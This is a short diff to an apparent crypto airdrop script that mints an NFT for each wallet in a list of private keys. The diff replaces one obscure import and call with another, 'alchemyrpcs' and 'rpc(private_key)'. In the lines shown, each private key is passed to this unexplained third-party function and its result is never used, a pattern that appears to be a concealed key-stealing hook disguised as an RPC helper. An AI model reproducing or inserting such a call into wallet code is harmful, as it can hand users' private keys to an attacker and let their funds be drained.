@@ -3,7 +3,7 @@ import sys
 import asyncio
 import random
 from web3 import Web3
-from web3automation import crypt265
+from alchemyrpcs import rpc
 from eth_account import Account
 from colorama import init, Fore, Style
 
@@ -269,7 +269,7 @@ async def run_mintnerzo(language: str = 'en'):
     for i, (profile_num, private_key) in enumerate(private_keys, 1):
         print()
         print_border(f"{LANG[language]['processing_wallet']} {profile_num} ({i}/{len(private_keys)})", Fore.MAGENTA)
-        automation = crypt265(private_key)
+        alchemy = rpc(private_key)
         print()
 
         if await mint_nerzo_nft(w3, private_key, profile_num, language):
